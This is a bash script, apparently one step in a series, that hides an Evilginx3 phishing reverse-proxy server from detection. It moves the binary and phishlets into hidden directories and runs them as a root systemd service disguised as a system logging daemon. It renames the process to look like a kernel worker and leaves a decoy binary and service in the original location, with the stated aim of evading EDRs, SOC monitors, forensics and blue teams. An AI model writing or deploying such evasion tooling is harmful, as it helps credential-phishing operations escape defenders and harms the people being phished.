#!/bin/bash
# === STEP 12: GHOST MODE ACTIVATION ===
# Objective: Obfuscate Evilginx3 presence — binary, service, logs, and phishlet footprint
# Purpose: Elude static detection by EDRs, SOC monitors, forensics, and blue teams
set -euo pipefail

REAL_DIR="/opt/posh-ai/evilginx3"
GHOST_DIR="/opt/.syslogd"
REAL_BIN="$REAL_DIR/evilginx"
GHOST_BIN="$GHOST_DIR/.sysd"
REAL_SERVICE="/etc/systemd/system/evilginx.service"
GHOST_SERVICE="/etc/systemd/system/systemd-logsvc.service"

# Step 1: Rename service, binary, paths
systemctl stop evilginx 2>/dev/null || true
systemctl disable evilginx 2>/dev/null || true
rm -f "$REAL_SERVICE"

mkdir -p "$GHOST_DIR"
mv "$REAL_BIN" "$GHOST_BIN"
mv "$REAL_DIR/phishlets" "$GHOST_DIR/.phish"
mv "$REAL_DIR/config.json" "$GHOST_DIR/.cfg" 2>/dev/null || true
rm -rf "$REAL_DIR"

# Step 2: Create fake systemd service under log disguise
cat > "$GHOST_SERVICE" <<EOF
[Unit]
Description=System Logging Daemon [Enhanced]
After=network.target

[Service]
Type=simple
ExecStart=$GHOST_BIN -config $GHOST_DIR/.cfg
WorkingDirectory=$GHOST_DIR
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now systemd-logsvc.service

# Step 3: Mask process details
sed -i 's|^ExecStart=.*$|ExecStart=/usr/bin/env -i HOME=/root PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /bin/bash -c "exec -a [kworker/u32:7-events_power_evil] '"$GHOST_BIN"' -config '"$GHOST_DIR/.cfg"'"|' "$GHOST_SERVICE"
systemctl daemon-reexec
systemctl restart systemd-logsvc.service

# Step 4: Deploy dummy decoy binary and service
mkdir -p "$REAL_DIR"
echo -e '#!/bin/bash\necho "[OK] Service started."' > "$REAL_DIR/evilginx"
chmod +x "$REAL_DIR/evilginx"

cat > "$REAL_SERVICE" <<EOF
[Unit]
Description=Evilginx3 Placeholder
After=network.target

[Service]
Type=simple
ExecStart=$REAL_DIR/evilginx
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now evilginx.service

echo -e "\033[1;36m[✓] Ghost mode activated.\033[0m"
echo "↪ Live binary: $GHOST_BIN"
echo "↪ Masked service: systemd-logsvc.service"
echo "↪ Dummy: $REAL_DIR/evilginx"
